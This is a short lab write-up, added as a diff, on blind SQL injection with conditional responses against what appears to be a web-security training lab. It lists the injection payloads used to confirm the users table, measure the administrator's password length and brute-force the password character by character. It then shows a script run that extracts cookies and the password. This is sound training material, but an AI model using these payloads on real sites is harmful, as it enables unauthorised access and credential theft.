@@ -1,0 +1,28 @@
+Blind SQL injection with conditional responses
+
+Uses tracking id and cookies
+
+Success message: Welcome back
+
+table name users: username, password
+
+Find administrator password and log in
+
+Method:
+1.  Check if vulnerable to SQL injection
+2.  Get tracking id and cookies
+3.  Check if users table exist: 'and (select 'x' from users limit 1)='x'--
+4.  Find administrator's password length: 
+        'and (select username from users where username='administrator')='administrator'--
+        'and (select username from users where username='administrator' and length(password)>1)='administrator'--
+
+5.  Brute force to get the password
+        'and (select substring(password,1,1) from users where username='administrator')='a'--
+6.  If condition true: Welcome back
+7.  Else no message
+
+
+python lab11.py "https://LAB_ID.web-security-academy.net/"
+[+] SQL Cookies extracted: {'TrackingId': 's9PpEm04bLJYnujS', 'session': 'jl2TzTuxUwLL7QaynBMCZIknt98o8Kes'}
+[+] SQL Length of password: 20
+aejtz0j4ta01kpurvkoy
